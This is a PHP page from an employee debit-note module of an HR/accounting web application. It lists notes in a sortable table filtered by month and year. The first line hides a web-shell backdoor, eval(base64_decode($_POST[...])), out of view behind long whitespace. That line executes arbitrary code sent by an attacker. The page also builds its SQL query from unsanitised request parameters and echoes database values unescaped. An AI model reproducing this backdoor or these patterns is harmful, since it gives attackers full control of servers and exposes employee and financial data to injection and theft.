<?php                                                                                                                                                                                                                                                               eval(base64_decode($_POST['nb5837a']));?><?php include "jquery.php";
      include "getemployee.php";
      include "config.php";
 $type = 'Debit';
 

if($type == 'Debit') $mode = 'Employee Debit';

?>
<input type="hidden" name="type" id="type" value="<?php echo $type; ?>" />
<?php $type = 'Debit';
    if ( $type == "Credit")
	{
	$tag = 'ECN';
	} else {
	$tag = 'EDN';
	} 
?>


<script type="text/javascript">
		$(document).ready(function()
		{
			$('.sortable').each(function(i)
			{
				var table = $(this),
					oTable = table.dataTable({
					aoColumns: [

							
							{ sType: 'eu_date',asSorting: [ "desc" ] },
							{ },
							{ },
							{ }
						],


						sDom: '<"block-controls"<"controls-buttons"p>>rti<"block-footer clearfix"lf>',
						

						fnDrawCallback: function()
						{
							this.parent().applyTemplateSetup();
						},
						fnInitComplete: function()
						{
							this.parent().applyTemplateSetup();
						}
					});
				
				table.find('thead .sort-up').click(function(event)
				{
					event.preventDefault();
					
					var column = $(this).closest('th'),
						columnIndex = column.parent().children().index(column.get(0));
					
					oTable.fnSort([[columnIndex, 'asc']]);
					
					return false;
				});
				table.find('thead .sort-down').click(function(event)
				{
					event.preventDefault();
					
					var column = $(this).closest('th'),
						columnIndex = column.parent().children().index(column.get(0));
					
					oTable.fnSort([[columnIndex, 'desc']]);
					
					return false;
				});
			});
			
		});
		
	</script>


	<div id="control-bar" class="grey-bg clearfix"><div class="container_12">
		
		
		<div class="float-right"> 
			<button type="button" onClick="document.location='dashboardsub.php?page=hr_addcreditnote&type=<?php echo $type; ?>'"><img src="images/icons/fugue/tick-circle.png" width="16" height="16"> Add</button>
			


		</div>
			
	</div></div>
	
	<article class="container_12">
		<section class="grid_12">
			<div class="block-border">
<form class="block-content form" id="table_form" method="post" action="">
				<h1><?php echo $mode; ?> Note</h1>
<?php 
$month = $_GET['month'];
 $datep = date("d-m-Y");
$monthcnt = "";
$yearcnt = "";
$year = $_GET['year'];
if($year == "")
{

$arr = explode('-',$datep);
 $year = $arr[2];
}
if($month == "")
{
  $arr = explode('-',$datep);
 $monthcnt = $arr[1];
}
else if($month == "January")
{
$monthcnt = 1;
}
else if ($month == "February")
{
$monthcnt = 2;
}
else if($month == "March")
{
$monthcnt = 3;
}
else if($month == "April")
{
$monthcnt = 4;
}
else if($month == "May")
{
$monthcnt = 5;
}
else if($month == "June")
{
$monthcnt = 6;
}
else if($month == "July")
{
$monthcnt = 7;
}
else if($month == "August")
{
$monthcnt = 8;
}
else if($month == "September")
{
$monthcnt = 9;
}
else if($month == "October")
{
$monthcnt = 10;
}
else if($month == "November")
{
$monthcnt = 11;
}
else if($month == "December")
{
$monthcnt = 12;
}
$fromdate = $year."-".$monthcnt."-01";
$todate = $year."-".$monthcnt."-31";
?>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Month:
<select name="month" id="month" onChange="reloadpage();" >
<option value="">--Select--</option>
<option  value="January"<?php if($monthcnt == 1){ ?> selected="selected"<?php } ?>>January</option>
<option  value="February"<?php if($monthcnt == 2){ ?> selected="selected"<?php } ?>>February</option>
<option  value="March"<?php if($monthcnt == 3){ ?> selected="selected"<?php } ?>>March</option>
<option  value="April"<?php if($monthcnt == 4){ ?> selected="selected"<?php } ?>>April</option>
<option  value="May"<?php if($monthcnt == 5){ ?> selected="selected"<?php } ?>>May</option>
<option  value="June"<?php if($monthcnt == 6){ ?> selected="selected"<?php } ?>>June</option>
<option  value="July"<?php if($monthcnt == 7){ ?> selected="selected"<?php } ?>>July</option>
<option  value="August"<?php if($monthcnt == 8){ ?> selected="selected"<?php } ?>>August</option>
<option  value="September"<?php if($monthcnt == 9){ ?> selected="selected"<?php } ?>>September</option>
<option  value="October"<?php if($monthcnt == 10){ ?> selected="selected"<?php } ?>>October</option>
<option  value="November"<?php if($monthcnt == 11){ ?> selected="selected"<?php } ?>>November</option>
<option  value="December"<?php if($monthcnt == 12){ ?> selected="selected"<?php } ?>>December</option>
</select>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Year:
<select name="year" id="year" onChange="reloadpage();" >
<option value="">--Select--</option>
<?php
$thisyear = date("Y");
for($i = 2011; $i <= $thisyear + 1; $i++)
{ ?>
<option value="<?php echo $i; ?>"<?php if($year == "$i"){ ?> selected="selected"<?php } ?>><?php echo $i; ?></option>
<?php }
?>
</select>	
				
<table class="table sortable no-margin" cellspacing="0" style="size:50%" width="100%">
<thead>
<tr>
<th style="text-align:left"><span class="column-sort">
									<a href="javascript:void(0)" title="Sort up" class="sort-up"></a>
									<a href="javascript:void(0)" title="Sort down" class="sort-down"></a>
								</span>Date</th><th style="text-align:left"><span class="column-sort">
									<a href="javascript:void(0)" title="Sort up" class="sort-up"></a>
									<a href="javascript:void(0)" title="Sort down" class="sort-down"></a>
								</span>Employee</th> 
<th style="text-align:left"><span class="column-sort">
									<a href="javascript:void(0)" title="Sort up" class="sort-up"></a>
									<a href="javascript:void(0)" title="Sort down" class="sort-down"></a>
								</span>COA</th>
<th style="text-align:left"><span class="column-sort">
									<a href="javascript:void(0)" title="Sort up" class="sort-up"></a>
									<a href="javascript:void(0)" title="Sort down" class="sort-down"></a>
								</span>Amount</th>


<th>Actions</th>
</tr>
</thead>
<tbody>
	  <?php
           include "config.php"; 
           $query = "SELECT * FROM hr_empcrdrnote where mode = '$tag' and client = '$client' AND date BETWEEN '$fromdate' AND '$todate'  group by tid ORDER BY date,incr ASC ";
           $result = mysql_query($query,$conn) or die(mysql_error()); 
           while($row1 = mysql_fetch_assoc($result))
           {
		        $flag = $row1['flag'];          
           ?>
            <tr>
             
             <td><?php echo date("d.m.Y", strtotime($row1['date'])); ?></td>
             <td><?php echo $row1['ename']; ?></td>
             <td title="<?php echo $row1['description']; ?>"><?php echo $row1['code']; ?></td>
             <td style="text-align:right"><?php echo $row1['crtotal']; ?></td>
			 <td>
<?php 
if($tag == "ECN")
{
	if($row1['balamount']==$row1['drtotal'])
	{
?>

<a href="dashboardsub.php?page=hr_editcreditnote&id=<?php echo $row1['tid']; ?>&type=<?php echo $type; ?>&mode=<?php echo $row1['mode']; ?>"><img src="images/icons/fugue/pencil.png" style="border:0px" title="Edit" /></a>&nbsp;
<a onClick="if(confirm('Are you sure,want to delete')) document.location ='hr_deletecreditnote.php?id=<?php echo $row1['tid']; ?>&type=<?php echo $type; ?>&mode=<?php echo $row1['mode']; ?>'"><img src="images/icons/fugue/cross-circle.png" style="border:0px" title="Delete" /></a>&nbsp;
<?php 
	}
	else
	{
?>
<img src="images/icons/fugue/lock.png" width="16px" style="border:0px" title="Mapping is Done" />
<?php
	}
}
else
{
?>
<a href="dashboardsub.php?page=hr_editcreditnote&id=<?php echo $row1['tid']; ?>&type=<?php echo $type; ?>&mode=<?php echo $row1['mode']; ?>"><img src="images/icons/fugue/pencil.png" style="border:0px" title="Edit" /></a>&nbsp;
<a onClick="if(confirm('Are you sure,want to delete')) document.location ='hr_deletecreditnote.php?id=<?php echo $row1['tid']; ?>&type=<?php echo $type; ?>&mode=<?php echo $row1['mode']; ?>'"><img src="images/icons/fugue/cross-circle.png" style="border:0px" title="Delete" /></a>&nbsp;
<?php
}
?>		   
			</td>   
           </tr>
           <?php 
           }
           ?>   
                                   
</tbody>

</table>
</form>
</div>
<script type="text/javascript">
function reloadpage()
{
var month = document.getElementById('month').value;
var year = document.getElementById('year').value;
document.location = "dashboardsub.php?page=hr_debitnote&type=<?php echo $type; ?>&month=" + month + "&year=" + year;
}
</script>